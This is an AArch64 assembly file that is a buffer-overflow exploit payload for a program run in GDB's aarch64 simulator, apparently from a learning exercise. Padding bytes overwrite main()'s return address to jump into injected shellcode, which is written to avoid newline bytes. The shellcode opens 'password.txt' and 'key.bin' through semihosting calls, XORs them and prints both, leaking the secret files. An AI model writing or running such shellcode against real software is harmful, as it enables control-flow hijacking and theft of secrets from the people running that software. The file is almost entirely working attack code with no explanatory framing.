/*
 * Use halt handler.
 * See gdb/sim/aarch64/simulator.c:handle_halt()
 */

#define AngelSVC_Reason_Open  0x01
#define AngelSVC_Reason_Close 0x02
#define AngelSVC_Reason_Write 0x05
#define AngelSVC_Reason_Read  0x06

/*
 * See gdb/sim/aarch64/simulator.c:
 * aarch64_decode_and_execute() (case GROUP_BREXSYS_1010:)
 * dexBr() (case BR_REG_110:)
 * dexExcpnGen()
 */
#define HALT_GROUP  (10 << 25) /* GROUP_BREXSYS_1010 */
#define HALT_GROUP2 ( 6 << 29) /* BR_REG_110 */
#define HALT_OPC2   ( 0 <<  2) /* OK */
#define HALT_LL     ( 0 <<  0)
#define HALT_OPC(opc)     ((opc)   << 21) /* 1:BRK, 2:HLT */
#define HALT_IMM16(imm16) ((imm16) << 5)

#define CALL_ExcpnGen(opc, imm16) \
	.long (HALT_GROUP | HALT_GROUP2 | HALT_OPC2 | HALT_LL | \
	HALT_OPC(opc) | HALT_IMM16(imm16))

/* See gdb/sim/aarch64/simulator.c:dexExcpnGen() (opc == 1 && LL == 0) */
#define CALL_BRK CALL_ExcpnGen(1, 0)

/*
 * See gdb/sim/aarch64/simulator.c:dexExcpnGen() (opc == 2 && LL == 0)
 * See gdb/sim/aarch64/simulator.c:handle_halt() (imm16 == 0xf000)
 */
#define CALL_HLT CALL_ExcpnGen(2, 0xf000)

	.org	0x1c10 - 0x110 - 0x20 + 0x10

	.section .text

	.globl	_start
	.type	_start, %function
_start:
	.long	0x61626364
	.long	0
	.long	0
	.long	0

	/*
	 * The return address from proc() is lower than buffer, 
	 * cannot overwrite it. Overwrite the return address from main().
	 */
	.long	_code /* return address from main() */

_code:
#if 0 /* to avoid 0x0a */
	ldr	x0, _start_addr
#else
	mov	x0, #_start_addr
	ldr	x0, [x0]
#endif
	mov	sp, x0

	/*
	 * SYSCALL NO: X0
	 * ARG1-3: *(SP+0),*(SP+8),*(SP+16)
	 * RETVAL: X0
	 * ERRCODE: -
	 */

__open:
#if 0 /* to avoid 0x0a */
	ldr	x0, _fname_addr
#else
	mov	x0, #_fname_addr
	ldr	x0, [x0]
#endif
	mov	x1, #0
	mov	x2, #0
	sub	sp, sp, #0x20
	str	x0, [sp, #0]
	str	x1, [sp, #8]
	str	x2, [sp, #16]
	mov	x1, sp
	mov	x0, #AngelSVC_Reason_Open
	CALL_HLT
	add	sp, sp, #0x20

__read:
	ldr	x1, _buffer_addr
	mov	x2, #16
	sub	sp, sp, #0x20
	str	x0, [sp, #0]
	str	x1, [sp, #8]
	str	x2, [sp, #16]
	mov	x1, sp
	mov	x0, #AngelSVC_Reason_Read
	CALL_HLT
	add	sp, sp, #0x20

_save_size:
	mov	x3, x0

__kopen:
	ldr	x0, _kname_addr
	mov	x1, #0
	mov	x2, #0
	sub	sp, sp, #0x20
	str	x0, [sp, #0]
	str	x1, [sp, #8]
	str	x2, [sp, #16]
	mov	x1, sp
	mov	x0, #AngelSVC_Reason_Open
	CALL_HLT
	add	sp, sp, #0x20

__kread:
	ldr	x1, _kbuffer_addr
	mov	x2, x3
	sub	sp, sp, #0x20
	str	x0, [sp, #0]
	str	x1, [sp, #8]
	str	x2, [sp, #16]
	mov	x1, sp
	mov	x0, #AngelSVC_Reason_Read
	CALL_HLT
	add	sp, sp, #0x20

_exchange:
	ldr	x0, _buffer_addr
	ldr	x1, _kbuffer_addr
	mov	x2, #0
1:	ldrb	w4, [x0, x2]
	ldrb	w5, [x1, x2]
	eor	w4, w4, w5
	strb	w4, [x0, x2]
	add	x2, x2, #1
	cmp	x2, x3
	b.ne	1b

__write:
	mov	x0, #1
	ldr	x1, _buffer_addr
	mov	x2, x3
	sub	sp, sp, #0x20
	str	x0, [sp, #0]
	str	x1, [sp, #8]
	str	x2, [sp, #16]
	mov	x1, sp
	mov	x0, #AngelSVC_Reason_Write
	CALL_HLT
	add	sp, sp, #0x20

__kwrite:
	mov	x0, #1
	ldr	x1, _kbuffer_addr
	mov	x2, x3
	sub	sp, sp, #0x20
	str	x0, [sp, #0]
	str	x1, [sp, #8]
	str	x2, [sp, #16]
	mov	x1, sp
	mov	x0, #AngelSVC_Reason_Write
	CALL_HLT
	add	sp, sp, #0x20

__exit:
	mov	x0, #0
	CALL_BRK

_fname:	.string	"password.txt"
_kname:	.string	"key.bin"

	.align 3
_start_addr:
	.quad	_start
_fname_addr:
	.quad	_fname
_kname_addr:
	.quad	_kname
_buffer_addr:
	.quad	_buffer
_kbuffer_addr:
	.quad	_kbuffer
_code_end:

_buffer:
	.space	16
_kbuffer:
	.space	16
